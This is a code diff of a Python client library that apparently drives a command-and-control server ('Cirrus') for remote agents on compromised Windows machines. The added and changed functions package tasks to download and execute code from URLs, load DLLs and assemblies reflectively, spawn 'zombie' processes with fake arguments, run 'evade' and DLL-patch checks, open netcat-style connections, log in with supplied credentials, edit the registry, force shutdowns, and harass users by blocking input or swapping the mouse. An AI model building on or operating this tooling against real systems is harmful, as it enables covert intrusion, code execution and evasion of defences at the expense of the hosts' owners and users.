@@ -15,23 +15,30 @@
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
 #
 
+from sys import stderr
 from requests import session
 from json import dumps, loads
 from datetime import datetime
-from genericpath import exists
 from websocket import WebSocketApp
 from threading import Thread, Event
+from selectors import DefaultSelector
 from base64 import b64decode, b64encode
 from include.config import Config, Utils
+from requests.exceptions import ConnectionError
 from os.path import expanduser, expandvars, isfile
-from selectors import DefaultSelector, EVENT_READ, EVENT_WRITE
-from include.util import nes, split_user_domain, do_ask, time_str
+from include.util import (
+    nes,
+    do_ask,
+    is_true,
+    time_str,
+    bytes_from_src,
+    split_user_domain,
+)
 
 SYSTEM_COMMANDS = [
     "cd",
     "chan",
-    "check-debug",
-    "check-dll",
+    "check_debug",
     "elevate",
     "jitter",
     "ls",
@@ -41,13 +48,11 @@ SYSTEM_COMMANDS = [
     "ps",
     "pwd",
     "refresh",
-    "reload-dll",
     "rev2self",
     "screenshot",
     "sleep",
     "untrust",
     "wait",
-    "zerotrace",
 ]
 
 TYPES_REG = [
@@ -65,12 +70,17 @@ TYPES_REG = [
     "uint64",
 ]
 TYPES_EXEC = ["", "dll", "asm", "exec", "pexec", "zombie"]
+TYPES_NETCAT = ["icmp", "tcp", "tcp", "tls", "tls-insecure", "udp"]
 
+ACTIONS_WTS = ["dis", "disconnect", "logoff", "ls", "message", "msg", "ps"]
 ACTIONS_REG = ["del", "delete", "dir", "get", "set", "ls", "rem", "remove", "rm"]
 ACTIONS_TROLL = ["bi", "block_input", "hc", "high_contrast", "sm", "swap_mouse", "wtf"]
+ACTIONS_POWER = ["restart", "shutdown"]
+ACTIONS_FUNCMAP = ["add", "del", "delete", "list", "ls", "remove", "remove_all"]
 ACTIONS_WINDOW = [
     "cl",
     "close",
+    "desktop",
     "dis",
     "disable",
     "en",
@@ -78,6 +88,8 @@ ACTIONS_WINDOW = [
     "fg",
     "focus",
     "get",
+    "in",
+    "input",
     "ls",
     "mb",
     "message",
@@ -88,48 +100,16 @@ ACTIONS_WINDOW = [
     "mv",
     "pos",
     "resize",
+    "send",
     "show",
     "size",
     "sw",
+    "text",
     "tr",
     "trans",
     "transparent",
-    "in",
-    "send",
     "type",
-    "text",
-    "input",
 ]
-
-
-def split_path(p, f):
-    if f[0] == "!":
-        v = expanduser(expandvars(f[1:]))
-        if not isfile(v):
-            raise ValueError(f'file "{v}" does not exist')
-        with open(v, "rb") as f:
-            p["data"] = b64encode(f.read()).decode("UTF-8")
-        del v
-        return
-    v = expanduser(expandvars(f))
-    if not isfile(v):
-        p["path"] = f
-        return
-    with open(v, "rb") as f:
-        p["data"] = b64encode(f.read()).decode("UTF-8")
-    del v
-
-
-def _try_hex_first(v):
-    try:
-        return int(v, 16)
-    except ValueError:
-        pass
-    try:
-        return int(v)
-    except ValueError:
-        pass
-    return None
 
 
 def _err_from_stat(r, url, ex):
@@ -139,19 +119,32 @@ def _err_from_stat(r, url, ex):
         d = r.json()
         r.close()
     except Exception:
-        raise CirrusError(f'"{url}" returned non-{ex} status: {r.status_code}')
+        raise CirrusError(
+            f'"{url}" returned non-{ex} status: {r.status_code}'
+        ) from None
     if not isinstance(d, dict) or len(d) == 0 or not nes(d.get("error")):
-        raise CirrusError(f'"{url}" returned non-{ex} status: {r.status_code}')
+        raise CirrusError(
+            f'"{url}" returned non-{ex} status: {r.status_code}'
+        ) from None
     raise CirrusError(
         f'"{url}" returned non-{ex} status: ({r.status_code}) {d["error"]}',
         sub=d["error"],
-    )
+    ) from None
 
 
 def _pkg_touch(path, line=None):
     if not nes(path):
         raise ValueError('"path" must be a non-empty string')
     p = {"action": "touch", "path": path}
+    if nes(line):
+        p["line"] = line
+    return p
+
+
+def _pkg_evade(action, line=None):
+    if not nes(action):
+        raise ValueError('"action" must be a non-empty string')
+    p = {"action": action.lower()}
     if nes(line):
         p["line"] = line
     return p
@@ -188,6 +181,19 @@ def _pkg_move(src, dest, line=None):
     return p
 
 
+def _pkg_wallpaper(data, line=None):
+    p = {"action": "wallpaper"}
+    b, r = bytes_from_src(data, cb64=True, ext=True, raw=False, empty=False)
+    if r:
+        p["path"] = b
+    else:
+        p["data"] = b64encode(b).decode("UTF-8")
+    del b, r
+    if nes(line):
+        p["line"] = line
+    return p
+
+
 def _pkg_profile(profile, line=None):
     if not nes(profile):
         raise ValueError('"profile" must be a non-empty string')
@@ -206,27 +212,11 @@ def _pkg_download(target, line=None):
     return p
 
 
-def _pkg_troll(action, arg1=None, line=None):
-    if not nes(action):
-        raise ValueError('"action" must be a non-empty string')
-    a = action.lower()
-    if a not in ACTIONS_TROLL:
-        raise ValueError(f'action "{action}" is not valid')
-    p = {"action": a}
-    if a == "wtf":
-        if isinstance(arg1, int) and arg1 > 0:
-            p["seconds"] = arg1
-        elif nes(arg1):
-            try:
-                p["seconds"] = int(arg1)
-            except ValueError:
-                pass
-    else:
-        if arg1 is None:
-            p["enable"] = True
-        else:
-            p["enable"] = bool(arg1)
-    del a
+def _pkg_upload(data, dest, line=None):
+    if not nes(dest):
+        raise ValueError('"dest" must be a non-empty string')
+    b, _ = bytes_from_src(data, cb64=True, raw=False)
+    p = {"path": dest, "data": b64encode(b).decode("UTF-8")}
     if nes(line):
         p["line"] = line
     return p
@@ -243,42 +233,38 @@ def _pkg_system(cmd, filter=None, line=None):
         del v
     else:
         p = {"cmd": cmd}
-    if nes(line):
-        p["line"] = line
     if isinstance(filter, Filter):
         p["filter"] = filter.json()
+    if nes(line):
+        p["line"] = line
     return p
 
 
 def _pkg_delete(path, force=False, line=None):
     if not nes(path):
         raise ValueError('"path" must be a non-empty string')
-    p = {"action": "delete", "path": path, "force": force}
+    p = {"action": "delete", "path": path, "force": is_true(force)}
     if nes(line):
         p["line"] = line
     return p
 
 
-def _pkg_kill(pid=None, proc=None, line=None):
-    if (not isinstance(pid, int) or pid <= 0) and not nes(proc):
-        raise ValueError('"pid" or "proc" must be specified')
-    if isinstance(pid, int) and pid > 0:
+def _pkg_kill(pid=None, pname=None, line=None):
+    if (not isinstance(pid, int) or not nes(pid)) and not nes(pname):
+        raise ValueError('"pid" or "pname" must be specified')
+    if nes(pid):
+        try:
+            p = {"action": "kill", "pid": int(pid)}
+        except ValueError:
+            raise ValueError('"pid" is not a valid number')
+        if p["pid"] < 1:
+            raise ValueError('"pid" must be an greater than zero')
+    elif isinstance(pid, int):
+        if pid < 1:
+            raise ValueError('"pid" must be an greater than zero')
         p = {"action": "kill", "pid": pid}
     else:
-        p = {"action": "kill_name", "name": proc}
-    if nes(line):
-        p["line"] = line
-    return p
-
-
-def _pkg_wallpaper(file, raw=None, line=None):
-    p = {"action": "wallpaper"}
-    if not isinstance(raw, (bytes, bytearray)):
-        if not nes(file):
-            raise ValueError('"file" must be a non-empty string')
-        split_path(p, file)
-    else:
-        p["data"] = b64encode(raw).decode("UTF-8")
+        p = {"action": "kill_name", "name": pname}
     if nes(line):
         p["line"] = line
     return p
@@ -290,71 +276,159 @@ def _pkg_pull(url, dest, agent=None, line=None):
     if not nes(dest):
         raise ValueError('"dest" must be a non-empty string')
     p = {"path": dest, "url": url}
-    if nes(line):
-        p["line"] = line
     if nes(agent):
         p["agent"] = agent
+    if nes(line):
+        p["line"] = line
     return p
 
 
-def _pkg_login(user, domain="", pw="", line=None):
+def _pkg_workhours(days="", start="", end="", line=None):
+    p = {"days": days}
+    if nes(start):
+        if ":" not in start:
+            raise ValueError("workhours: invalid start format")
+        x = start.split(":")
+        if len(x) != 2:
+            raise ValueError("workhours: invalid start format")
+        try:
+            h, j = int(x[0]), int(x[1])
+        except ValueError:
+            raise ValueError("workhours: invalid start format")
+        del x
+        if h > 23 or j > 59:
+            raise ValueError("workhours: invalid start format")
+        p["start_hour"], p["start_min"] = h, j
+        del h, j
+    if nes(end):
+        if ":" not in end:
+            raise ValueError("workhours: invalid end format")
+        x = end.split(":")
+        if len(x) != 2:
+            raise ValueError("workhours: invalid end format")
+        try:
+            n, m = int(x[0]), int(x[1])
+        except ValueError:
+            raise ValueError("workhours: invalid end format")
+        del x
+        if n > 23 or m > 59:
+            raise ValueError("workhours: invalid end format")
+        p["end_hour"], p["end_min"] = n, m
+        del n, m
+    if nes(line):
+        p["line"] = line
+    return p
+
+
+def _pkg_troll(action, enable=False, seconds=None, line=None):
+    if not nes(action):
+        raise ValueError('"action" must be a non-empty string')
+    a = action.lower()
+    if a not in ACTIONS_TROLL:
+        raise ValueError(f'action "{action}" is not valid')
+    p = {"action": a}
+    if a == "wtf":
+        if nes(seconds):
+            try:
+                p["seconds"] = int(seconds)
+            except ValueError:
+                raise ValueError('"seconds" is not a valid number')
+            if p["seconds"] < 1:
+                raise ValueError('"seconds" must be an greater than zero')
+        elif isinstance(seconds, int):
+            if seconds < 1:
+                raise ValueError('"seconds" must be an greater than zero')
+            p["seconds"] = seconds
+    else:
+        p["enable"] = is_true(enable)
+    del a
+    if nes(line):
+        p["line"] = line
+    return p
+
+
+def _pkg_login(user, domain="", pw="", interactive=False, line=None):
     if not nes(user):
         raise ValueError('"user" must be a non-empty string')
-    p = dict()
     u, d = split_user_domain(user, domain)
-    p["user"], p["domain"] = u, d
+    p = {"user": u, "domain": d, "interactive": is_true(interactive)}
+    del u, d
     if nes(pw):
         p["pass"] = pw
-    del u, d
     if nes(line):
         p["line"] = line
     return p
 
 
-def _pkg_upload(target, dest, raw=None, line=None):
-    if not nes(dest):
-        raise ValueError('"dest" must be a non-empty string')
-    if not isinstance(raw, (bytes, bytearray)):
-        if not nes(target):
-            raise ValueError('"target" must be a non-empty string')
-        if target[0] == "!":
-            target = target[1:]
-        p = expanduser(expandvars(target))
-        if not exists(p):
-            raise ValueError(f'target "{p}" does not exist')
-        with open(p, "rb") as f:
-            b = b64encode(f.read()).decode("UTF-8")
-        del p
-    else:
-        b = b64encode(raw).decode("UTF-8")
-    p = {"path": dest, "data": b}
+def _pkg_funcmap(action, function="", data=None, raw=False, line=None):
+    if not nes(action):
+        raise ValueError('"action" must be a non-empty string')
+    a = action.lower()
+    if a not in ACTIONS_FUNCMAP:
+        raise ValueError(f'action "{action}" is not valid')
+    p = {"action": a}
+    if (
+        (a == "add" or a.startswith("del") or a.startswith("remove"))
+        and not a.endswith("all")
+        and not nes(function)
+    ):
+        raise ValueError('"function" is required')
+    p["raw"] = is_true(raw)
+    p["function"] = function
+    if a[0] != "l" and not a.startswith("del") and not a.startswith("remove"):
+        b, _ = bytes_from_src(data, cb64=True, ext=False, empty=False)
+        p["data"] = b64encode(b).decode("UTF-8")
+        del b
     if nes(line):
         p["line"] = line
     return p
 
 
-def _pkg_assembly(file, raw=None, show=False, detach=False, filter=None, line=None):
-    if filter is not None and not isinstance(filter, Filter):
-        raise ValueError('"filter" must be a Filter type')
-    if not isinstance(raw, (bytes, bytearray)):
-        if not nes(file):
-            raise ValueError('"file" must be a non-empty string')
-        if file[0] == "!":
-            file = file[1:]
-        p = expanduser(expandvars(file))
-        if not exists(p):
-            raise ValueError(f'file "{p}" does not exist')
-        with open(p, "rb") as f:
-            b = b64encode(f.read()).decode("UTF-8")
-        del p
+def _pkg_check_patch(dll, function="", data=None, raw=False, line=None):
+    if not nes(dll):
+        raise ValueError('"dll" must be a non-empty string')
+    if raw is True and not nes(function):
+        raise ValueError('cannot use "raw" with an empty function')
+    p = {"dll": dll, "raw": is_true(raw), "function": function}
+    b, r = bytes_from_src(data, cb64=True, ext=True, empty=True, explicit=True)
+    if r:
+        p["path"] = b
     else:
-        b = b64encode(raw).decode("UTF-8")
-    p = {"show": show, "detach": detach, "data": b}
+        p["data"] = b64encode(b).decode("UTF-8")
+    del b, r
+    if nes(line):
+        p["line"] = line
+    return p
+
+
+def _pkg_netcat(host, proto=None, seconds=None, data=None, read=False, line=None):
+    if not nes(host):
+        raise ValueError('"host" must be a non-empty string')
+    p = {"host": host, "read": is_true(read)}
+    if proto is None or len(proto) == 0:
+        p["protocol"] = "tcp"
+    else:
+        v = proto.lower()
+        if len(v) > 0 and v not in TYPES_NETCAT:
+            raise ValueError(f'protocol "{proto}" is not valid')
+        p["protocol"] = v
+        del v
+    if nes(seconds):
+        try:
+            p["seconds"] = int(seconds)
+        except ValueError:
+            raise ValueError('"seconds" is not a valid number')
+        if p["seconds"] < 1:
+            raise ValueError('"seconds" must be an greater than or equal to zero')
+    elif isinstance(seconds, int):
+        if seconds < 0:
+            raise ValueError('"seconds" must be an greater than or equal to zero')
+        p["seconds"] = seconds
+    b, _ = bytes_from_src(data, empty=True)
+    p["data"] = b64encode(b).decode("UTF-8")
     del b
     if nes(line):
         p["line"] = line
-    if isinstance(filter, Filter):
-        p["filter"] = filter.json()
     return p
 
 
@@ -363,38 +437,166 @@ def _pkg_pull_exec(url, agent=None, show=False, detach=False, filter=None, line=
         raise ValueError('"url" must be a non-empty string')
     if filter is not None and not isinstance(filter, Filter):
         raise ValueError('"filter" must be a Filter type')
-    p = {"url": url, "show": show, "detach": detach}
-    if nes(line):
-        p["line"] = line
+    p = {"url": url, "show": is_true(show), "detach": is_true(detach)}
     if nes(agent):
         p["agent"] = agent
     if isinstance(filter, Filter):
         p["filter"] = filter.json()
+    if nes(line):
+        p["line"] = line
+    return p
+
+
+def _pkg_power(action, message="", force=False, seconds=None, reason=None, line=None):
+    if not nes(action):
+        raise ValueError('"action" must be a non-empty string')
+    a = action.lower()
+    if a not in ACTIONS_POWER:
+        raise ValueError(f'action "{action}" is not valid')
+    p = {"action": a, "message": message, "force": is_true(force)}
+    if nes(reason):
+        try:
+            p["reason"] = int(reason, base=0)
+        except ValueError:
+            raise ValueError('"reason" is not a valid number')
+        if p["reason"] < 1:
+            raise ValueError('"reason" must be an greater than or equal to zero')
+    elif isinstance(reason, int):
+        if reason < 0:
+            raise ValueError('"reason" must be an greater than or equal to zero')
+        p["reason"] = reason
+    if nes(seconds):
+        try:
+            p["seconds"] = int(seconds)
+        except ValueError:
+            raise ValueError('"seconds" is not a valid number')
+        if p["seconds"] < 1:
+            raise ValueError('"seconds" must be an greater than or equal to zero')
+    elif isinstance(seconds, int):
+        if seconds < 0:
+            raise ValueError('"seconds" must be an greater than or equal to zero')
+        p["seconds"] = seconds
+    if nes(line):
+        p["line"] = line
+    del a
+    return p
+
+
+def _pkg_assembly(data, show=False, detach=False, filter=None, entry=None, line=None):
+    if filter is not None and not isinstance(filter, Filter):
+        raise ValueError('"filter" must be a Filter type')
+    b, _ = bytes_from_src(data, cb64=True, empty=False, explicit=True)
+    p = {
+        "show": is_true(show),
+        "detach": is_true(detach),
+        "data": b64encode(b).decode("UTF-8"),
+    }
+    del b
+    if nes(entry):
+        p["entry"] = entry
+    if isinstance(filter, Filter):
+        p["filter"] = filter.json()
+    if nes(line):
+        p["line"] = line
     return p
 
 
 def _pkg_dll(
-    file,
-    raw=None,
+    data,
     reflect=True,
     show=False,
     detach=False,
     filter=None,
+    entry=None,
     line=None,
 ):
     if filter is not None and not isinstance(filter, Filter):
         raise ValueError('"filter" must be a Filter type')
-    p = {"show": show, "detach": detach, "reflect": reflect}
-    if not isinstance(raw, (bytes, bytearray)):
-        if not nes(file):
-            raise ValueError('"file" must be a non-empty string')
-        split_path(p, file)
+    p = {"show": is_true(show), "detach": is_true(detach), "reflect": is_true(reflect)}
+    b, r = bytes_from_src(data, cb64=True, ext=True, explicit=True, empty=False)
+    if r:
+        p["path"] = b
     else:
-        p["data"] = b64encode(raw).decode("UTF-8")
-    if nes(line):
-        p["line"] = line
+        p["data"] = b64encode(b).decode("UTF-8")
+    del b, r
+    if nes(entry):
+        p["entry"] = entry
     if isinstance(filter, Filter):
         p["filter"] = filter.json()
+    if nes(line):
+        p["line"] = line
+    return p
+
+
+def _pkg_wts(
+    action,
+    session=None,
+    title="",
+    text="",
+    flags=None,
+    seconds=None,
+    wait=False,
+    line=None,
+):
+    if not nes(action):
+        raise ValueError('"action" must be a non-empty string')
+    a = action.lower()
+    if a not in ACTIONS_WTS:
+        raise ValueError(f'action "{action}" is not valid')
+    p = {"action": a}
+    if a != "ls":
+        if session is None:
+            p["session"] = -1
+        elif nes(session):
+            if session == "desktop" or session == "cur" or session == "current":
+                session = -1
+            else:
+                try:
+                    p["session"] = int(session)
+                except ValueError:
+                    raise ValueError('"session" is not a valid number')
+                if p["session"] < -1:
+                    raise ValueError('"session" cannot be less than -1')
+        elif isinstance(session, int):
+            if session < -1:
+                raise ValueError('"session" cannot be less than -1')
+            p["session"] = session
+    if a == "msg" or a == "message":
+        if nes(text):
+            v, _ = bytes_from_src(text, path=False)
+            text = v.decode("UTF-8")
+            del v
+        if nes(title):
+            v, _ = bytes_from_src(title, path=False)
+            title = v.decode("UTF-8")
+            del v
+        p["text"], p["title"] = text, title
+        if nes(flags):
+            try:
+                p["flags"] = int(flags, base=0)
+            except ValueError:
+                raise ValueError('"flags" is not a valid number')
+            if p["flags"] < 1:
+                raise ValueError('"flags" must be an greater than or equal to zero')
+        elif isinstance(flags, int):
+            if flags < 0:
+                raise ValueError('"flags" must be an greater than or equal to zero')
+            p["flags"] = flags
+        if nes(seconds):
+            try:
+                p["seconds"] = int(seconds)
+            except ValueError:
+                raise ValueError('"seconds" is not a valid number')
+            if p["seconds"] < 1:
+                raise ValueError('"seconds" must be an greater than or equal to zero')
+        elif isinstance(seconds, int):
+            if seconds < 0:
+                raise ValueError('"seconds" must be an greater than or equal to zero')
+            p["seconds"] = seconds
+        p["wait"] = is_true(wait)
+    del a
+    if nes(line):
+        p["line"] = line
     return p
 
 
@@ -421,9 +623,9 @@ def _pkg_spawn(
             if exec.lower().startswith("http") and "://" in exec:
                 method, e = "pexec", exec
             else:
-                method, e = "exec", {"show": show, "cmd": exec}
+                method, e = "exec", {"show": is_true(show), "cmd": exec}
         elif method.lower() == "exec":
-            e = {"show": show, "cmd": exec}
+            e = {"show": is_true(show), "cmd": exec}
         elif method.lower() == "pexec":
             e = exec
         elif method.lower() == "url":  # "url" is only accepted here as a simple method
@@ -441,25 +643,25 @@ def _pkg_spawn(
     if e is not None:
         p["payload"] = e
     del e
-    if nes(line):
-        p["line"] = line
     if nes(profile):
         p["profile"] = profile
     if isinstance(filter, Filter):
         p["filter"] = filter.json()
+    if nes(line):
+        p["line"] = line
     return p
 
 
 def _pkg_zombie(
-    file,
+    data,
     fake_args,
-    raw=None,
     show=False,
     detach=False,
     filter=None,
     user="",
     domain="",
     pw="",
+    entry=None,
     line=None,
 ):
     if not nes(fake_args):
@@ -470,46 +672,41 @@ def _pkg_zombie(
         raise ValueError(
             '"user" cannot be empty when a domain or password is specified'
         )
-    if not isinstance(raw, (bytes, bytearray)):
-        if not nes(file):
-            raise ValueError('"file" must be a non-empty string')
-        if file[0] == "!":
-            file = file[1:]
-        p = expanduser(expandvars(file))
-        if not exists(p):
-            raise ValueError(f'file "{p}" does not exist')
-        with open(p, "rb") as f:
-            b = b64encode(f.read()).decode("UTF-8")
-        del p
-    else:
-        b = b64encode(raw).decode("UTF-8")
+    b, _ = bytes_from_src(data, cb64=True, raw=True, explicit=True, empty=False)
     u, d = split_user_domain(user, domain)
     if pw is None:
         pw = ""
     p = {
-        "show": show,
-        "detach": detach,
-        "data": b,
+        "show": is_true(show),
+        "detach": is_true(detach),
+        "data": b64encode(b).decode("UTF-8"),
         "fake": fake_args,
         "user": u,
         "domain": d,
         "pass": pw,
     }
-    del u, b, d
-    if nes(line):
-        p["line"] = line
+    del u, d, b
+    if nes(entry):
+        p["entry"] = entry
     if isinstance(filter, Filter):
         p["filter"] = filter.json()
+    if nes(line):
+        p["line"] = line
     return p
 
 
 def _pkg_window(
     action,
     handle=None,
-    arg1=None,
-    arg2=None,
-    arg3=None,
-    arg4=None,
+    state=None,
+    opacity=None,
+    pos_x=None,
+    pos_y=None,
+    width=None,
+    height=None,
+    title="",
+    text="",
+    flags=None,
     line=None,
 ):
     if not nes(action):
@@ -517,110 +714,121 @@ def _pkg_window(
     a = action.lower()
     if a not in ACTIONS_WINDOW:
         raise ValueError(f'action "{action}" is not valid')
-    if isinstance(handle, int) and handle < 0:
-        if a[0] != "m" or (a[0] == "m" and (a[1] == "v" or a[1] == "o")):
-            raise ValueError('"handle" integer must be greater than or equal to zero')
+    if isinstance(handle, int) and handle < 0 and (a == "mv" or a == "move"):
+        raise ValueError('"handle" must be and integer greater than or equal to zero')
     elif handle == "desktop" or handle == "wm":
         handle = -1
     elif handle == "all" or handle == "*" or handle == "0":
         handle = 0
     elif nes(handle):
-        v = _try_hex_first(handle)
-        if v is None:
+        try:
+            handle = int(handle, 16)
+        except ValueError:
             raise ValueError(
-                '"handle" string value must be a base-16 or 10 positive integer'
+                '"handle" string value must be a valid base16 positive integer'
             )
-        handle = v
-        del v
-    else:
+    elif not isinstance(handle, int):
         handle = 0
+    if handle < -1:
+        raise ValueError('"handle" cannot be less than -1')
     p = {"action": a, "handle": handle}
-    if a in ["sw", "show"]:
-        if arg1 is None:
-            p["state"] = ""
-        elif nes(arg1):
+    if nes(text):
+        v, _ = bytes_from_src(text, path=False)
+        text = v.decode("UTF-8")
+        del v
+    if nes(title):
+        v, _ = bytes_from_src(title, path=False)
+        title = v.decode("UTF-8")
+        del v
+    if a == "sw" or a == "show":
+        if nes(state):
             try:
-                p["state"] = int(arg1)
+                p["state"] = int(state)
             except ValueError:
-                p["state"] = arg1
-        elif isinstance(arg1, int) and arg1 < 12 and arg1 >= 0:
-            p["state"] = arg1
+                p["state"] = state
+            else:
+                if p["state"] < 0 or p["state"] > 12:
+                    raise ValueError('"state" must be a str or int inside [0, 12]')
+        elif isinstance(state, int):
+            if state < 0 or state > 12:
+                raise ValueError('"state" must be a str or int inside [0, 12]')
+            p["state"] = state
         else:
-            raise ValueError('"arg1" must be a str or int between 0-12')
-    elif a in ["tr", "trans", "transparent"]:
-        if arg1 is None:
-            raise ValueError('"arg1" must be a value between 0-255 or a percentage')
-        if isinstance(arg1, int) and (arg1 > 255 or arg1 < 0):
-            raise ValueError('"arg1" must be a value between 0-255 or a percentage')
-        if nes(arg1):
+            p["state"] = ""
+    elif a == "tr" or a == "trans" or a == "transparent":
+        if nes(opacity):
             try:
-                if arg1[-1] == "%":
-                    p["level"] = max(
-                        255, int(round((float(int(arg1[:-1])) / 100.0) * 255))
+                if "%" in opacity:
+                    p["level"] = min(
+                        255, int(round((float(int(opacity[:-1])) / 100.0) * 255))
                     )
                 else:
-                    p["level"] = int(arg1)
+                    p["level"] = int(opacity)
             except ValueError:
-                raise ValueError('"arg1" must be a value between 0-255 or a percentage')
+                p["level"] = state
+            else:
+                if p["level"] < 0 or p["level"] > 255:
+                    raise ValueError(
+                        '"opacity" must be a str or int inside [0, 255] or a percentage'
+                    )
+        elif isinstance(opacity, int):
+            if opacity < 0 or opacity > 12:
+                raise ValueError(
+                    '"opacity" must be a str or int inside [0, 255] or a percentage'
+                )
+            p["level"] = opacity
         else:
-            p["level"] = arg1
-    elif a in ["mv", "pos", "move", "size", "resize"]:
-        if nes(arg1):
+            raise ValueError('"opacity" must be a value between 0-255 or a percentage')
+    elif a == "mv" or a == "pos" or a == "move" or a == "size" or a == "resize":
+        if nes(pos_x):
             try:
-                arg1 = int(arg1)
+                p["x"] = int(pos_x)
             except ValueError:
-                pass
-        if nes(arg2):
+                raise ValueError('"pos_x" must be None, a str or an integer')
+        elif isinstance(pos_x, int):
+            p["x"] = pos_x
+        if nes(pos_y):
             try:
-                arg2 = int(arg2)
+                p["y"] = int(pos_y)
             except ValueError:
-                pass
-        if nes(arg3):
+                raise ValueError('"pos_y" must be None, a str or an integer')
+        elif isinstance(pos_y, int):
+            p["y"] = pos_y
+        if nes(width):
             try:
-                arg3 = int(arg3)
+                p["width"] = int(width)
             except ValueError:
-                pass
-        if nes(arg4):
+                raise ValueError('"width" must be None, a str or an integer')
+        elif isinstance(width, int):
+            p["width"] = width
+        if nes(height):
             try:
-                arg4 = int(arg4)
+                p["height"] = int(height)
             except ValueError:
-                pass
-        if arg1 is not None and not isinstance(arg1, int):
-            raise ValueError('"arg1" must be none or a integer')
-        if arg2 is not None and not isinstance(arg2, int):
-            raise ValueError('"arg2" must be none or a integer')
-        if arg3 is not None and not isinstance(arg3, int):
-            raise ValueError('"arg3" must be none or a integer')
-        if arg4 is not None and not isinstance(arg4, int):
-            raise ValueError('"arg4" must be none or a integer')
-        if isinstance(arg1, int):
-            p["x"] = arg1
-        if isinstance(arg2, int):
-            p["y"] = arg2
-        if isinstance(arg3, int):
-            p["width"] = arg3
-        if isinstance(arg4, int):
-            p["height"] = arg4
-    elif a in ["in", "send", "type", "text", "input"]:
-        if nes(arg1):
-            p["text"] = arg1
-    elif a in ["mb", "msg", "msgbox", "message", "messagebox"]:
-        if not nes(arg1):
-            raise ValueError('"arg1" must be a non-empty string')
-        if nes(arg3):
+                raise ValueError('"height" must be None, a str or an integer')
+        elif isinstance(height, int):
+            p["height"] = height
+    elif a == "in" or a == "send" or a == "type" or a == "text" or a == "input":
+        if nes(text):
+            p["text"] = text
+        elif nes(title):
+            p["text"] = title
+    elif a[0] == "m":
+        if nes(title):
+            p["title"] = title
+        if nes(text):
+            p["text"] = text
+        if nes(flags):
             try:
-                arg3 = int(arg3)
+                p["flags"] = int(flags, base=0)
             except ValueError:
-                pass
-        if arg2 is not None and not isinstance(arg2, str):
-            raise ValueError('"arg2" must be none or a string')
-        if arg3 is not None and not isinstance(arg3, int):
-            raise ValueError('"arg3" must be none or a integer')
-        p["title"] = arg1
-        if nes(arg2):
-            p["text"] = arg2
-        if isinstance(arg3, int):
-            p["flags"] = arg3
+                raise ValueError('"flags" is not a valid number')
+            if p["flags"] < 1:
+                raise ValueError('"flags" must be an greater than or equal to zero')
+        elif isinstance(flags, int):
+            if flags < 0:
+                raise ValueError('"flags" must be an greater than or equal to zero')
+            p["flags"] = flags
     del a
     if nes(line):
         p["line"] = line
@@ -653,27 +861,24 @@ def _pkg_execute(
         pw = ""
     p = {
         "cmd": cmd,
-        "show": show,
-        "detach": detach,
+        "show": is_true(show),
+        "detach": is_true(detach),
         "user": u,
         "domain": d,
         "pass": pw,
     }
     del u, d
-    if nes(line):
-        p["line"] = line
     if stdin is not None:
         if isinstance(stdin, str):
-            try:
-                b64decode(stdin, validate=True)
-            except ValueError:
-                p["stdin"] = b64encode(stdin.encode("UTF-8")).decode("UTF-8")
-            else:
-                p["stdin"] = stdin
+            b, _ = bytes_from_src(stdin, empty=True)
+            p["stdin"] = b64encode(b).decode("UTF-8")
+            del b
         else:
             p["stdin"] = b64encode(stdin).decode("UTF-8")
     if isinstance(filter, Filter):
         p["filter"] = filter.json()
+    if nes(line):
+        p["line"] = line
     return p
 
 
@@ -717,17 +922,15 @@ def _pkg_registry(
             raise ValueError(f'type "{type}" is not valid')
     elif a not in ACTIONS_REG:
         raise ValueError(f'action "{action}" is not valid')
-    p = {"key": key, "force": force, "action": a}
+    p = {"key": key, "force": is_true(force), "action": a}
     if a == "set" or a == "edit" or a == "update":
         if data is not None:
-            if isinstance(data, (bytes, bytearray)):
-                p["data"] = b64encode(data).decode("UTF-8")
-            elif isinstance(data, (int, float)):
+            if isinstance(data, (int, float)):
                 p["data"] = str(data)
-            elif not isinstance(data, str):
-                raise ValueError('"data" type is not valid')
             else:
-                p["data"] = data
+                b, _ = bytes_from_src(data, empty=True)
+                p["data"] = b64encode(b).decode("UTF-8")
+                del b
         p["type"] = type
     if nes(value):
         p["value"] = value
@@ -769,7 +972,10 @@ class Api(object):
     def close(self):
         if self._events is None:
             return
-        self._events.close()
+        try:
+            self._events.close()
+        except OSError:
+            pass
 
     def alive(self):
         return self._events is not None and self._events._sock is not None
@@ -806,10 +1012,13 @@ class Api(object):
             raise ValueError(f'unsupported method: "{method}"')
         if not callable(f):
             raise ValueError(f'invalid method: "{method}"')
-        if json:
-            r = f(f"{self._base}/{url}", json=json)
-        else:
-            r = f(f"{self._base}/{url}", data=data)
+        try:
+            if json:
+                r = f(f"{self._base}/{url}", json=json)
+            else:
+                r = f(f"{self._base}/{url}", data=data)
+        except ConnectionError:
+            raise OSError(f'Cannot access "{self._base}/{url}"') from None
         if isinstance(exp, list) and r.status_code not in exp:
             _err_from_stat(r, f"{self._base}/{url}", "|".join([str(e) for e in exp]))
         if isinstance(exp, int):
@@ -949,15 +1158,14 @@ class Api(object):
         self.script_duplicate(src, dest)
         self.script_remove(src)
 
-    def script_import(self, name, file):
+    def script_import(self, name, data):
         if not nes(name):
             raise ValueError('"name" must be a non-empty string')
-        if not nes(file):
-            raise ValueError('"file" must be a non-empty string')
-        if file[0] == "!":
-            file = file[1:]
-        with open(expanduser(expandvars(file))) as f:
-            d = loads(f.read())
+        if not nes(data):
+            raise ValueError('"data" must be a non-empty string')
+        b, _ = bytes_from_src(data, cb64=True, raw=False, empty=False)
+        d = loads(b)
+        del b
         self.script_add(
             name,
             d.get("commands"),
@@ -1039,6 +1247,15 @@ class Api(object):
         finally:
             del p
 
+    def script_evade(self, name, line, action):
+        if not nes(name):
+            raise ValueError('"name" must be a non-empty string')
+        if not nes(line):
+            raise ValueError('"line" must be a non-empty string')
+        return self._req(
+            f"script/{name}/evade", 201, "put", json=_pkg_evade(action, line)
+        )
+
     def script_copy(self, name, line, src, dest):
         if not nes(name):
             raise ValueError('"name" must be a non-empty string')
@@ -1055,6 +1272,15 @@ class Api(object):
             raise ValueError('"line" must be a non-empty string')
         return self._req(
             f"script/{name}/io", 201, "put", json=_pkg_move(src, dest, line)
+        )
+
+    def script_wallpaper(self, name, line, data):
+        if not nes(name):
+            raise ValueError('"name" must be a non-empty string')
+        if not nes(line):
+            raise ValueError('"line" must be a non-empty string')
+        return self._req(
+            f"script/{name}/ui", 201, "put", json=_pkg_wallpaper(data, line)
         )
 
     def script_profile(self, name, line, profile):
@@ -1075,13 +1301,16 @@ class Api(object):
